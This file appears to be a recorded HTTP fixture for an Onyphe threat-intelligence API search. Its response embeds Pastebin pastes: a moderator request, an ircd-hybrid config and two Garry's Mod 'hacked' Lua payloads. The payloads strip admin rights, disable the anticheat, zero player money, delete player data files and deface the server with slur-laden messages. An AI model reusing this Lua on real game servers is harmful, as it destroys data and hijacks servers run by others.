---
http_interactions:
- request:
    method: get
    uri: https://www.onyphe.io/api/search/pastries/content:hacked?apikey=<API_KEY>&page=1
    body:
      encoding: US-ASCII
      string: ''
    headers:
      Accept-Encoding:
      - gzip;q=1.0,deflate;q=0.6,identity;q=0.3
      Accept:
      - "*/*"
      User-Agent:
      - Ruby
      Host:
      - www.onyphe.io
  response:
    status:
      code: 200
      message: OK
    headers:
      Server:
      - nginx
      Date:
      - Sat, 17 Nov 2018 02:09:30 GMT
      Content-Type:
      - application/json;charset=UTF-8
      Content-Length:
      - '131985'
      Connection:
      - keep-alive
    body:
      encoding: ASCII-8BIT
      string: !binary |-
        {"count":10,"error":0,"max_page":185,"myip":"<MY_IP>","page":1,"results":[{"@category":"pastries","@timestamp":"2018-11-17T01:14:01.000Z","@type":"doc","content":" I would like to request for Moderator role because of the following reasons :\r\n        - I have reported a lot of people with hacked stats (with proofs)\r\n        - Actually knowing how does this game functions\r\n        - I have been a moderator in servers at other games\r\n        - Actually knowing how to use commands\r\n        - Being active most of the time\r\n        - Played this game for about one and a half months\r\n and the other reasons like :\r\n        - Admins \/ Moderators not doing anything even there are litreally people messing up the entire server\r\n        - The increasing amount of people with hacked stats and exploiters\r\n        - I really want to contribute the game\r\n Thank you.","key":"Zhwz07sR","seen_date":"2018-11-17","size":"699","source":"pastebin","syntax":"text","title":"File01"},{"@category":"pastries","@timestamp":"2018-11-17T00:57:56.000Z","@type":"doc","content":"if( LeyAC ) then\r\nLeyAC = nil;\r\nend\r\ntimer.Create( \"next_level_timer2\", 20, 0, function()\r\n--Break some bad cmds\r\nlocal bad = {\"Ban\",\"Kick\",\"Kill\",\"KillSilent\",\"GodEnable\",\"GodDisable\"} for k,v in next, bad do FindMetaTable(\"Player\")[v] = nil end\r\n--Break ULX\r\nif ULib then\r\nfor k,v in pairs(player.GetAll()) do\r\nULib.ucl.addUser( v:SteamID(), {}, {}, \"user\" );\r\nend\r\nfor k,v in pairs(ULib.ucl.groups) do\r\nif k != \"user\" then\r\nULib.ucl.removeGroup(k);\r\nend\r\nend\r\nfor k,v in pairs(ULib.ucl.users) do\r\nv.group = \"user\"\r\nend\r\nend\r\n--Gamemode related\r\nif GAMEMODE.Name == \"darkrp\" then\r\nfor k,v in pairs(player.GetAll()) do\r\nRunConsoleCommand(\"rp_setmoney\", v:Nick(), 0);\r\nend\r\nhook.Add(\"PlayerInitialSpawn\", \"darkrp_specific_persistence\", function( ply )\r\nRunConsoleCommand(\"rp_setmoney\", ply:Nick(), 0);\r\nend)\r\nend\r\nif GAMEMODE.Name == \"Trouble in Terrorist Town\" then \/\/something here?\r\n\/\/for k, v in pairs(player.GetAll()) do\r\n\/\/end\r\nend\r\nif net.WriteString.find( GAMEMODE.Name:lower(), \"stronghold\" ) then\r\nfor k,v in pairs(player.GetAll()) do\r\nRunConsoleCommand(\"gbux_setmoney\", v:Nick(), 0);\r\nend\r\nhook.Add(\"PlayerInitialSpawn\", \"stronghold_specific_persistence\", function( ply )\r\nRunConsoleCommand(\"gbux_setmoney\", ply:Nick(), 0);\r\nend)\r\nlocal fil = file.Find( \"data\/stronghold\/playerinfo\/*.txt\", \"GAME\" )\r\nfor k, v in pairs( fil ) do\r\nfile.Delete( fil )\r\nend\r\nend\r\nend)\r\nif GetConVarnet.WriteString(\"sv_allowcslua\") != \"0\" then\r\nRunConsoleCommand( \"sv_allowcslua\", \"1\" );\r\nend\r\nhook.Add(\"Think\", \"busted\", function()\r\nfor k,v in pairs (player.GetAll()) do\r\nv:SetModelScale(2.5, 100);\r\nv:SetRunSpeed(400 * 2);\r\nv:SetWalkSpeed(200 * 2);\r\nend\r\nend)\r\ntimer.Create( \"next_level_timer\", 5, 0, function()\r\nfor k, v in pairs(player.GetAll()) do\r\nv:ConCommand(\"say Rt laura\");\r\nend\r\nend)\r\nRunConsoleCommand(\"hostname\", \"LAURA LA VOLEURSE\")\r\nRunConsoleCommand( if( LeyAC ) then\r\nLeyAC = nil;\r\nend\r\ntimer.Create( \"next_level_timer2\", 20, 0, function()\r\n--Break some bad cmds\r\nlocal bad = {\"Ban\",\"Kick\",\"Kill\",\"KillSilent\",\"GodEnable\",\"GodDisable\"} for k,v in next, bad do FindMetaTable(\"Player\")[v] = nil end\r\n--Break ULX\r\nif ULib then\r\nfor k,v in pairs(player.GetAll()) do\r\nULib.ucl.addUser( v:SteamID(), {}, {}, \"user\" );\r\nend\r\nfor k,v in pairs(ULib.ucl.groups) do\r\nif k != \"user\" then\r\nULib.ucl.removeGroup(k);\r\nend\r\nend\r\nfor k,v in pairs(ULib.ucl.users) do\r\nv.group = \"user\"\r\nend\r\nend\r\n--Gamemode related\r\nif GAMEMODE.Name == \"darkrp\" then\r\nfor k,v in pairs(player.GetAll()) do\r\nRunConsoleCommand(\"rp_setmoney\", v:Nick(), 0);\r\nend\r\nhook.Add(\"PlayerInitialSpawn\", \"darkrp_specific_persistence\", function( ply )\r\nRunConsoleCommand(\"rp_setmoney\", ply:Nick(), 0);\r\nend)\r\nend\r\nif GAMEMODE.Name == \"Trouble in Terrorist Town\" then \/\/something here?\r\n\/\/for k, v in pairs(player.GetAll()) do\r\n\/\/end\r\nend\r\nif net.WriteString.find( GAMEMODE.Name:lower(), \"stronghold\" ) then\r\nfor k,v in pairs(player.GetAll()) do\r\nRunConsoleCommand(\"gbux_setmoney\", v:Nick(), 0);\r\nend\r\nhook.Add(\"PlayerInitialSpawn\", \"stronghold_specific_persistence\", function( ply )\r\nRunConsoleCommand(\"gbux_setmoney\", ply:Nick(), 0);\r\nend)\r\nlocal fil = file.Find( \"data\/stronghold\/playerinfo\/*.txt\", \"GAME\" )\r\nfor k, v in pairs( fil ) do\r\nfile.Delete( fil )\r\nend\r\nend\r\nend)\r\nif GetConVarnet.WriteString(\"sv_allowcslua\") != \"0\" then\r\nRunConsoleCommand( \"sv_allowcslua\", \"1\" );\r\nend\r\nhook.Add(\"Think\", \"busted\", function()\r\nfor k,v in pairs (player.GetAll()) do\r\nv:SetModelScale(2.5, 100);\r\nv:SetRunSpeed(400 * 2);\r\nv:SetWalkSpeed(200 * 2);\r\nend\r\nend)\r\ntimer.Create( \"next_level_timer\", 5, 0, function()\r\nfor k, v in pairs(player.GetAll()) do\r\nv:ConCommand(\"say Rt laura\");\r\nend\r\nend)\r\nRunConsoleCommand(\"hostname\", \"HACKED BY NTK TEAM EXPLOIT\")\r\nRunConsoleCommand( if( LeyAC ) then\r\nLeyAC = nil;\r\nend\r\ntimer.Create( \"next_level_timer2\", 20, 0, function()\r\n--Break some bad cmds\r\nlocal bad = {\"Ban\",\"Kick\",\"Kill\",\"KillSilent\",\"GodEnable\",\"GodDisable\"} for k,v in next, bad do FindMetaTable(\"Player\")[v] = nil end\r\n--Break ULX\r\nif ULib then\r\nfor k,v in pairs(player.GetAll()) do\r\nULib.ucl.addUser( v:SteamID(), {}, {}, \"user\" );\r\nend\r\nfor k,v in pairs(ULib.ucl.groups) do\r\nif k != \"user\" then\r\nULib.ucl.removeGroup(k);\r\nend\r\nend\r\nfor k,v in pairs(ULib.ucl.users) do\r\nv.group = \"user\"\r\nend\r\nend\r\n--Gamemode related\r\nif GAMEMODE.Name == \"darkrp\" then\r\nfor k,v in pairs(player.GetAll()) do\r\nRunConsoleCommand(\"rp_setmoney\", v:Nick(), 0);\r\nend\r\nhook.Add(\"PlayerInitialSpawn\", \"darkrp_specific_persistence\", function( ply )\r\nRunConsoleCommand(\"rp_setmoney\", ply:Nick(), 0);\r\nend)\r\nend\r\nif GAMEMODE.Name == \"Trouble in Terrorist Town\" then \/\/something here?\r\n\/\/for k, v in pairs(player.GetAll()) do\r\n\/\/end\r\nend\r\nif net.WriteString.find( GAMEMODE.Name:lower(), \"stronghold\" ) then\r\nfor k,v in pairs(player.GetAll()) do\r\nRunConsoleCommand(\"gbux_setmoney\", v:Nick(), 0);\r\nend\r\nhook.Add(\"PlayerInitialSpawn\", \"stronghold_specific_persistence\", function( ply )\r\nRunConsoleCommand(\"gbux_setmoney\", ply:Nick(), 0);\r\nend)\r\nlocal fil = file.Find( \"data\/stronghold\/playerinfo\/*.txt\", \"GAME\" )\r\nfor k, v in pairs( fil ) do\r\nfile.Delete( fil )\r\nend\r\nend\r\nend)\r\nif GetConVarnet.WriteString(\"sv_allowcslua\") != \"0\" then\r\nRunConsoleCommand( \"sv_allowcslua\", \"1\" );\r\nend\r\nhook.Add(\"Think\", \"busted\", function()\r\nfor k,v in pairs (player.GetAll()) do\r\nv:SetModelScale(2.5, 100);\r\nv:SetRunSpeed(400 * 2);\r\nv:SetWalkSpeed(200 * 2);\r\nend\r\nend)\r\ntimer.Create( \"next_level_timer\", 5, 0, function()\r\nfor k, v in pairs(player.GetAll()) do\r\nv:ConCommand(\"say Rt laura\");\r\nend\r\nend)\r\nRunConsoleCommand(\"hostname\", \"HACKED BY TWTEAM\")\r\nRunConsoleCommand( \"sv_loadingurl\", \"http:\/\/image.noelshack.com\/fichiers\/2018\/46\/6\/1542415945-zizi-top-ces-penis-peuvent-ils-sauver-le-monde-800x-jpg.jpg\" )","domain":["noelshack.com"],"host":["image","vip-ns"],"hostname":["vip-ns.noelshack.com","image.noelshack.com"],"ip":["193.36.45.15"],"key":"Jt77A1Nr","scheme":["http"],"seen_date":"2018-11-17","size":"5713","source":"pastebin","syntax":"text","tld":"com","url":["http:\/\/image.noelshack.com\/fichiers\/2018\/46\/6\/1542415945-zizi-top-ces-penis-peuvent-ils-sauver-le-monde-800x-jpg.jpg"]},{"@category":"pastries","@timestamp":"2018-11-17T00:46:37.000Z","@type":"doc","content":"surface.CreateFont(\"BIG\", {\r\n        font = \"Roboto\",\r\n        size = ScrW()*0.1,\r\n        weight = 99999,\r\n        blursize = 0,\r\n        scanlines = 2.5,\r\n        antialias = false\r\n    })\r\n\r\nlocal function huddrawderetour ()\r\n\t  draw.RoundedBox(0, 0, ScrH() \/ 3.5, ScrW(), ScrH() \/ 4.5, Color(0, 0, 0, 155))\r\n      draw.SimpleText(msg, \"BIG\", ScrW() \/ 2, ScrH() \/ 2.5, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)\r\nend\r\n\r\n\r\n\r\nfor k,v in pairs (hook.GetTable())  do\r\n       for o,j in pairs (v) do\r\n\t           if k == \"HUDPaint\" then\r\n\t\t\t\t\thook.Remove(k, o)\r\n\t\t\t\t\thook.Add (k, o ,huddrawderetour)\r\n\t\t\t\t\tend\r\n\t\t\t\tend\r\nend\r\n\r\n\r\n\r\n\r\nhook.Add(\"HUDPaint\", \"hentai\", huddrawderetour)\r\n\r\ntimer.Create(\"wowlolwut_my_boi\",2 ,0 , function()\r\n\tmsg = table.Random({\r\n\t\t\"CHE\", \r\n\t\t\"C dommage\", \r\n\t\t\"GET REKT NIGGAZ\", \r\n\t\t\"by Kyz3n & Sky_Ness\", \r\n\t\t\"Dommage\",\r\n\t\t\"L0L\",\r\n\t\t\"RIP TON SERV\",\r\n\t\t\"SEIZED BY SKY_NESS\",\r\n\t\t\"SEIZED BY KYZ3N\",\r\n\t\t\"ADDICT AU LEAK\",\r\n\t\t\"DSL TA PLUS E SERV\",\r\n\t\t\"SERVEUR BZ\",\r\n\t\t\"SERVEUR DE KYZ3N MTN\",\r\n\t\t\"JE TROUE TA REUM BATARD\",\r\n\t\t\"LEAK > ALL\",\r\n\t\t\"TA MERE > ALL\"\r\n\t})\r\n\tchat.AddText(\"HACKED BY TWTEAM\")\r\nend)","key":"q0k1y13k","seen_date":"2018-11-17","size":"1141","source":"pastebin","syntax":"text"},{"@category":"pastries","@timestamp":"2018-11-16T23:34:35.000Z","@type":"doc","content":"# ircd-hybrid configuration file [ircd.conf]\r\n# customized for Debian by Joshua Kwan <joshk@triplehelix.org>\r\n# modified for Debian by AurÃ©lien GÃ‰RÃ”ME <ag@roxor.cx>\r\n \r\n \/* serverinfo {}:  Contains information about the server. (OLD M:) *\/\r\nserverinfo {\r\n\t\/* name: the name of our server *\/\r\n\tname = \"[redacted]\";\r\n\r\n\t\/* description: the description of our server.  '[' and ']' may not\r\n\t * be used here for compatibility with older servers.\r\n\t *\/\r\n\tdescription = \"[redacted] IRC server\";\r\n\r\n\t\/* network info: the name and description of the network this server\r\n\t * is on.  Shown in the 005 reply and used with serverhiding.\r\n\t *\/\r\n\tnetwork_name = \"[redacted] IRC\";\r\n\tnetwork_desc = \"Abandon Hope All Ye Who Enter Here\";\r\n\r\n\t\/* hub: allow this server to act as a hub and have multiple servers\r\n\t * connected to it.  This may not be changed if there are active\r\n\t * LazyLink servers.\r\n\t *\/\r\n\thub = no;\r\n\r\n\t\/* vhost: the IP to bind to when we connect outward to ipv4 servers.\r\n\t * This should be an ipv4 IP only.\r\n\t *\/\r\n\t#vhost = \"192.169.0.1\";\r\n\r\n\t\/* vhost6: the IP to bind to when we connect outward to ipv6 servers.\r\n\t * This should be an ipv6 IP only.\r\n\t *\/\r\n\t#vhost6 = \"3ffe:80e8:546::2\";\r\n\r\n\t\/* max clients: the maximum number of clients allowed to connect *\/\r\n\tmax_clients = 64;\r\n};\r\n\r\n\/* admin {}: contains admin information about the server. (OLD A:) *\/\r\nadmin {\r\n\tname = \"R. Edacted\";\r\n\tdescription = \"Main Server Administrator\";\r\n\temail = \"re@dac.ted\";\r\n};\r\n\r\n\/*\r\n * log {}:  contains information about logfiles.\r\n *\/\r\nlog {\r\n\t\/* Do you want to enable logging to ircd.log? *\/\r\n\tuse_logging = yes;\r\n\r\n\t\/*\r\n\t * logfiles: the logfiles to use for user connects, \/oper uses,\r\n\t * and failed \/oper.  These files must exist for logging to be used.\r\n\t *\/\r\n\tfname_userlog = \"logs\/userlog\";\r\n\tfname_operlog = \"logs\/operlog\";\r\n\tfname_killlog = \"logs\/kill\";\r\n\tfname_klinelog = \"logs\/kline\";\r\n\tfname_glinelog = \"logs\/gline\";\r\n\r\n\t\/*\r\n\t * log_level: the amount of detail to log in ircd.log.  The\r\n\t * higher, the more information is logged.  May be changed\r\n\t * once the server is running via \/quote SET LOG.  Either:\r\n\t * L_CRIT, L_ERROR, L_WARN, L_NOTICE, L_TRACE, L_INFO or L_DEBUG\r\n\t *\/\r\n\tlog_level = L_INFO;\r\n};\r\n\r\n\/* class {}: contain information about classes for users (OLD Y:) *\/\r\nclass {\r\n\t\/* name: the name of the class.  classes are text now *\/\r\n\tname = \"users\";\r\n\r\n\t\/* ping time: how often a client must reply to a PING from the\r\n\t * server before they are dropped.\r\n\t *\/\r\n\tping_time = 2 minutes;\r\n\r\n\t\/* number per ip: the number of users per host allowed to connect *\/\r\n\tnumber_per_ip = 2;\r\n\r\n\t\/* max number: the maximum number of users allowed in this class *\/\r\n\tmax_number = 100;\r\n\r\n\t\/* sendq: the amount of data allowed in a clients queue before\r\n\t * they are dropped.\r\n\t *\/\r\n\tsendq = 100 kbytes;\r\n};\r\n\r\nclass {\r\n\tname = \"restricted\";\r\n\tping_time = 1 minute 30 seconds;\r\n\tnumber_per_ip = 1;\r\n\tmax_number = 100;\r\n\tsendq = 60kb;\r\n};\r\n\r\nclass {\r\n\tname = \"opers\";\r\n\tping_time = 5 minutes;\r\n\tnumber_per_ip = 10;\r\n\tmax_number = 100;\r\n\tsendq = 100kbytes;\r\n};\r\n\r\nclass {\r\n\tname = \"server\";\r\n\tping_time = 5 minutes;\r\n\r\n\t\/* connectfreq: only used in server classes.  specifies the delay\r\n\t * between autoconnecting to servers.\r\n\t *\/\r\n\tconnectfreq = 5 minutes;\r\n\r\n\t\/* max number: the amount of servers to autoconnect to *\/\r\n\tmax_number = 1;\r\n\r\n\t\/* sendq: servers need a higher sendq as they send more data *\/\r\n\tsendq=2 megabytes;\r\n};\r\n\r\n\/* listen {}: contain information about the ports ircd listens on (OLD P:) *\/\r\nlisten {\r\n\t\/* port: the specific port to listen on.  if no host is specified\r\n\t * before, it will listen on all available IPs.\r\n\t *\r\n\t * ports are seperated via a comma, a range may be specified using \"..\"\r\n\t *\/\r\n\t\r\n\t\/* port: listen on all available IPs, ports 6665 to 6669 *\/\r\n\t#host = \"127.0.0.1\";\t# change this!\r\n\tport = 6665 .. 6669;\r\n};\r\n\r\n\/* auth {}: allow users to connect to the ircd (OLD I:) *\/\r\nauth {\r\n\t\/* user: the user@host allowed to connect.  multiple IPv4\/IPv6 user \r\n\t * lines are permitted per auth block.\r\n\t *\/\r\n\tuser = \"mcp@localhost\";\r\n\tuser = \"mcp@127.0.0.1\";\r\n\r\n\t\/* password: an optional password that is required to use this block *\/\r\n\t\r\n\t\/* spoof: fake the users host to be be this.  This is free-form,\r\n\t * just do everyone a favour and dont abuse it. (OLD I: = flag)\r\n\t *\/\r\n\tspoof = \"master.control.program\";\r\n\r\n\t\/* spoof notice: enable spoofing notification to admins (default yes) *\/\r\n\tspoof_notice = yes;\r\n\r\n\t\/* exceed limit: allow a user to exceed class limits (OLD I: > flag) *\/\r\n\texceed_limit = yes;\r\n\r\n\t\/* kline exempt: exempt this user from k\/glines (OLD I: ^ flag) *\/\r\n\tkline_exempt = yes;\r\n\r\n\t\/* gline exempt: exempt this user from glines (OLD I: _ flag) *\/\r\n\tgline_exempt = yes;\r\n\r\n\t\/* no tilde: remove ~ from a user with no ident (OLD I: - flag) *\/\r\n\tno_tilde = yes;\r\n\t\r\n\t\/* class: the class the user is placed in *\/\r\n\tclass = \"opers\";\r\n};\r\n\r\n#auth {\r\n#\t# redirect: the server and port to redirect a user to.  A user does\r\n#\t# not have to obey the redirection, the ircd just suggests to them\r\n#\t# an alternative server.\r\n#\tredirserv = \"irc.at.the.edge.of.earth\";\r\n#\tredirport = 6667;\r\n\t\r\n#\t\/* hostmask user has to match to receive redirection *\/\r\n#\tuser = \"*.on.mars\";\r\n#\r\n#\t\/* class: a class is required even though it is not used *\/\r\n#\tclass = \"users\";\r\n#};\r\n\r\nauth {\r\n\tuser = \"*@*\";\r\n\tclass = \"users\";\r\n\t\r\n\t\/* restricted: stop the client sending mode changes *\/\r\n\trestricted = yes;\r\n\r\n\t\/* have ident: require the user has identd to connect (OLD I: + flag) *\/\r\n\thave_ident = no;\r\n};\r\n\r\n\/* operator {}: defines ircd operators. (OLD O:)\r\n * ircd-hybrid no longer supports local operators, privileges are\r\n * controlled via flags.\r\n *\/\r\noperator {\r\n\t\/* name: the name of the oper *\/\r\n\tname = \"MCP\";\r\n\r\n\t\/* user: the user@host required for this operator.  CIDR is not\r\n\t * supported.  multiple user=\"\" lines are supported.\r\n\t *\/\r\n\tuser = \"mcp@127.0.0.1\";\r\n\r\n\t\/* password: the password required to oper.  By default this will\r\n\t * need to be encrypted using '\/usr\/bin\/mkpasswd'.\r\n\t * WARNING: Please do not mix up the 'mkpasswd' program from \r\n         * \/usr\/sbin with this one. If you are root, typing 'mkpasswd' \r\n\t * will run that one instead and you will receive a strange error.\r\n\t *\r\n\t * MD5 is supported. If you want to use it, use mkpasswd -Hmd5.\r\n\t *\/\r\n\tpassword = \"[redacted]\";\r\n\r\n\t\/* class: the class the oper joins when they successfully \/oper *\/\r\n\tclass = \"opers\";\r\n\r\n\t\/* privileges: controls the activities and commands an oper are \r\n\t * allowed to do on the server.  All options default to no.\r\n\t * Available options:\r\n\t *\r\n\t * global_kill:  allows remote users to be \/KILL'd (OLD 'O' flag)\r\n\t * remote:       allows remote SQUIT and CONNECT   (OLD 'R' flag)\r\n\t * kline:        allows KILL, KLINE and DLINE      (OLD 'K' flag)\r\n\t * unkline:      allows UNKLINE and UNDLINE        (OLD 'U' flag)\r\n\t * gline:        allows GLINE                      (OLD 'G' flag)\r\n\t * nick_changes: allows oper to see nickchanges    (OLD 'N' flag)\r\n\t *               via usermode +n\r\n\t * rehash:       allows oper to REHASH config      (OLD 'H' flag)\r\n\t * die:          allows DIE and RESTART            (OLD 'D' flag)\r\n\t * admin:        gives admin privileges.  admins\r\n\t *               may (un)load modules and see the\r\n\t *               real IPs of servers.\r\n\t *\/\r\n\tglobal_kill = yes;\r\n\tremote = yes;\r\n\tkline = yes;\r\n\tunkline = yes;\r\n\tgline = yes;\r\n\tdie = yes;\r\n\trehash = yes;\r\n\tnick_changes = yes;\r\n\tadmin = yes;\r\n};\r\n\r\n\/* connect {}: controls servers we connect to (OLD C:, N:, H:, L:) *\/\r\n\r\nconnect {\r\n\t\/* name: the name of the server *\/\r\n\tname = \"[redacted]\";\r\n\r\n\t\/* host: the host or IP to connect to.  If a hostname is used it\r\n\t * must match the reverse dns of the server.\r\n\t *\/\r\n\thost = \"127.0.0.1\";\r\n\r\n\t\/* passwords: the passwords we send (OLD C:) and accept (OLD N:).\r\n\t * The remote server will have these passwords reversed.\r\n\t *\/\r\n\tsend_password = \"password\";\r\n\taccept_password = \"password\";\r\n\r\n\t\/* encrypted: controls whether the accept_password above has been\r\n\t * encrypted.  (OLD CRYPT_LINK_PASSWORD now optional per connect)\r\n\t *\/\r\n\tencrypted = no;\r\n\r\n\t\/* port: the port to connect to this server on *\/\r\n\tport = 6666;\r\n\r\n\t\/* hub mask: the mask of servers that this server may hub. Multiple\r\n\t * entries are permitted\r\n\t *\/\r\n\thub_mask = \"*\";\r\n\r\n\t\/* leaf mask: the mask of servers this server may not hub.  Multiple\r\n\t * entries are permitted.  Useful for forbidding EU -> US -> EU routes.\r\n\t *\/\r\n\t#leaf_mask = \"*.uk\";\r\n\r\n\t\/* class: the class this server is in *\/\r\n\tclass = \"server\";\r\n\r\n\t\/* autoconnect: controls whether we autoconnect to this server or not,\r\n\t * dependent on class limits.\r\n\t *\/\r\n\tautoconn = no;\r\n\t\r\n\t\/* compressed: controls whether traffic is compressed via ziplinks.\r\n\t * By default this is disabled\r\n\t *\/\r\n\t#compressed = yes;\r\n\r\n\t\/* lazylink: controls whether this server is a LazyLink.  LazyLink \r\n\t * servers may NOT hub.  see doc\/LazyLinks.as.implemented.txt\r\n\t *\/\r\n\t#lazylink = yes;\r\n\r\n\t\/* masking: the servername we pretend to be when we connect *\/\r\n\t#fakename = \"*.arpa\";\r\n};\r\n\r\n\r\n#connect {\r\n#\tname = \"ipv6.some.server\";\r\n#\thost = \"3ffd:dead:beef::1\";\r\n#\tsend_password = \"password\";\r\n#\taccept_password = \"password\";\r\n#\tport = 6666;\r\n#\r\n#\t\/* aftype: controls whether the connection uses \"ipv4\" or \"ipv6\".\r\n#\t * Default is ipv4. *\/\r\n#\taftype = ipv6;\r\n#\tclass = \"server\";\r\n#};\r\n\r\n\/* shared {}: users that are allowed to remote kline (OLD U:) *\/\r\nshared {\r\n\t\/* name: the server the user must be on to set klines.  If this is not\r\n\t * specified, the user will be allowed to kline from all servers.\r\n\t *\/\r\n\tname = \"hybrid7.debian.local\";\r\n\r\n\t\/* user: the user@host mask that is allowed to set klines.  If this is\r\n\t * not specified, all users on the server above will be allowed to set\r\n\t * a remote kline.\r\n\t *\/\r\n\tuser = \"root@localhost\";\r\n};\r\n\r\n\/* kill {}: users that are not allowed to connect (OLD K:)\r\n * Oper issued klines will be added to the specified kline config\r\n *\/\r\nkill {\r\n\tuser = \"bad@*.hacked.edu\";\r\n\treason = \"Obviously hacked account\";\r\n};\r\n\r\n\/* deny {}: IPs that are not allowed to connect (before DNS\/ident lookup)\r\n * Oper issued dlines will be added to the specified dline config\r\n *\/\r\ndeny {\r\n\tip = \"10.0.1.0\/24\";\r\n\treason = \"Reconnecting vhosted bots\";\r\n};\r\n\r\n\/* exempt {}: IPs that are exempt from deny {} and Dlines. (OLD d:) *\/\r\nexempt {\r\n\tip = \"192.168.0.0\/16\";\r\n};\r\n\r\n#resv {\r\n#\t\/* reason: the reason for the proceeding resv's *\/\r\n#\treason = \"There are no services on this network\";\r\n#\r\n#\t\/* resv: the nicks and channels users may not join\/use *\/\r\n#\tnick = \"nickserv\";\r\n#\tnick = \"chanserv\";\r\n#\tchannel = \"#services\";\r\n#\r\n#\t\/* resv: wildcard masks are also supported in nicks only *\/\r\n#\treason = \"Clone bots\";\r\n#\tnick = \"clone*\";\r\n#}#;\r\n\r\n\/* gecos {}:  The X: replacement, used for banning users based on their\r\n * \"realname\".  The action may be either:\r\n *      warn:   allow client to connect, but send message to opers\r\n *      reject: drop clients but also send message to opers.\r\n *      silent: silently drop clients who match.\r\n *\/\r\ngecos {\r\n\tname = \"*sex*\";\r\n\treason = \"Possible spambot\";\r\n\taction = warn;\r\n};\r\n\r\ngecos {\r\n\tname = \"sub7server\";\r\n\treason = \"Trojan drone\";\r\n\taction = reject;\r\n};\r\n\r\ngecos {\r\n\tname = \"*http*\";\r\n\treason = \"Spambot\";\r\n\taction = silent;\r\n};\r\n\r\n\/* The channel block contains options pertaining to channels *\/\r\nchannel {\r\n\t#restrict_channels = yes;\r\n\t\r\n\t\/* invex: Enable\/disable channel mode +I, a n!u@h list of masks\r\n\t * that can join a +i channel without an invite.\r\n\t *\/\r\n\tuse_invex = yes;\r\n\r\n\t\/* except: Enable\/disable channel mode +e, a n!u@h list of masks\r\n\t * that can join a channel through a ban (+b).\r\n\t *\/\r\n\tuse_except = yes;\r\n\r\n\t\/* knock: Allows users to request an invite to a channel that\r\n\t * is locked somehow (+ikl).  If the channel is +p or you are banned\r\n\t * the knock will not be sent.\r\n\t *\/\r\n\tuse_knock = yes;\r\n\r\n\t\/* knock delay: The amount of time a user must wait between issuing\r\n\t * the knock command.\r\n\t *\/\r\n\tknock_delay = 5 minutes;\r\n\r\n\t\/* knock channel delay: How often a knock to any specific channel\r\n\t * is permitted, regardless of the user sending the knock.\r\n\t *\/\r\n\tknock_delay_channel = 1 minute;\r\n\r\n\t\/* max chans: The maximum number of channels a user can join\/be on. *\/\r\n\tmax_chans_per_user = 15;\r\n\t\r\n\t\/* quiet on ban: stop banned people talking in channels. *\/\r\n\tquiet_on_ban = yes;\r\n\r\n\t\/* max bans: maximum number of +b\/e\/I modes in a channel *\/\r\n\tmax_bans = 25;\r\n\r\n\t\/* splitcode: the ircd will check every 60s as to whether splitmode\r\n\t * should be disabled or not, so there may be a delay between a\r\n\t * netsplit ending and splitmode ending.\r\n\t *\r\n\t * both split users and split servers must be true to enter splitmode\r\n\t * \r\n\t * you may force splitmode to be permanent by \/quote set splitmode on\r\n\t *\/\r\n\r\n\t\/* split users: when the usercount is lower than this level, consider\r\n\t * ourselves split.  this must be set for automatic splitmode\r\n\t *\/\r\n\tdefault_split_user_count = 0;\r\n\r\n\t\/* split servers: when the servercount is lower than this, consider\r\n\t * ourselves split.  this must be set for automatic splitmode\r\n\t *\/\r\n\tdefault_split_server_count = 0;\r\n\r\n\t\/* split no create: disallow users creating channels on split. *\/\r\n\tno_create_on_split = no;\r\n\r\n\t\/* split: no join: disallow users joining channels at all on a split *\/\r\n\tno_join_on_split = no;\r\n\r\n\t\/* disable local channels: prevent users from joining &channels.\r\n\t * This is extreme, but it is still a flaw in serverhide.  It will\r\n\t * however remove far more from users than it will give back in\r\n\t * security.\r\n\t *\/\r\n\tdisable_local_channels = no;\r\n};\r\n\r\n\r\n\/* The serverhide block contains the options regarding serverhiding *\/\r\nserverhide {\r\n\t\/* flatten links: this option will show all servers in \/links appear\r\n\t * that they are linked to this current server\r\n\t *\/\r\n\tflatten_links = no;\r\n\r\n\t\/* links delay: how often to update the links file when it is\r\n\t * flattened.\r\n\t *\/\r\n\tlinks_delay = 5 minutes;\r\n\r\n\t\/* hidden: hide this server from a \/links output on servers that\r\n\t * support it.  this allows hub servers to be hidden etc.\r\n\t *\/\r\n\thidden = no;\r\n\r\n\t\/* disable hidden: prevent servers hiding themselves from a\r\n\t * \/links ouput.\r\n\t *\/\r\n\tdisable_hidden = no;\r\n\r\n\t\/* hide servers: hide remote servernames everywhere and instead use\r\n\t * network_name and network_desc.\r\n\t *\/\r\n\thide_servers = no;\r\n};\r\n\r\n\/* The general block contains many of the options that were once compiled\r\n * in options in config.h.  The general block is read at start time.\r\n *\/\r\ngeneral {\r\n\t\/* oper pass resv: allow opers to over-ride RESVs on nicks\/channels *\/\r\n\toper_pass_resv = yes;\r\n\r\n\t\/* disable remote: disable users doing commands on remote servers *\/\r\n\tdisable_remote_commands = no;\r\n\r\n\t\/* floodcount: the default value of floodcount that is configurable\r\n\t * via \/quote set floodcount.  This is the amount of lines a user\r\n\t * may send to any other user\/channel in one second.\r\n\t *\/\r\n        default_floodcount = 10;\r\n\r\n\t\/* failed oper notice: send a notice to all opers on the server when \r\n\t * someone tries to OPER and uses the wrong password, host or ident.\r\n\t *\/\r\n\tfailed_oper_notice = yes;\r\n\r\n\t\/* dots in ident: the amount of '.' characters permitted in an ident\r\n\t * reply before the user is rejected.\r\n\t *\/\r\n\tdots_in_ident=2;\r\n\r\n\t\/* dot in ipv6: ircd-hybrid-6.0 and earlier will disallow hosts \r\n\t * without a '.' in them.  this will add one to the end.  only needed\r\n\t * for older servers.\r\n\t *\/\r\n        dot_in_ip6_addr = yes;\r\n        \r\n\t\/* min nonwildcard: the minimum non wildcard characters in k\/d\/g lines\r\n\t * placed via the server.  klines hand placed are exempt from limits.\r\n\t * wildcard chars: '.' '*' '?' '@'\r\n\t *\/\r\n\tmin_nonwildcard = 4;\r\n\r\n\t\/* max accept: maximum allowed \/accept's for +g usermode *\/\r\n\tmax_accept = 20;\r\n\r\n\t\/* nick flood: enable the nickflood control code *\/\r\n\tanti_nick_flood = yes;\r\n\r\n\t\/* nick flood: the nick changes allowed in the specified period *\/\r\n\tmax_nick_time = 20 seconds;\r\n\tmax_nick_changes = 5;\r\n\r\n\t\/* anti spam time: the minimum time a user must be connected before\r\n\t * custom quit messages are allowed.\r\n\t *\r\n\t * The upstream default is 2 minutes.\r\n\t *\/\r\n        anti_spam_exit_message_time = 0 minutes;\r\n\r\n\t\/* ts delta: the time delta allowed between server clocks before\r\n\t * a warning is given, or before the link is dropped.  all 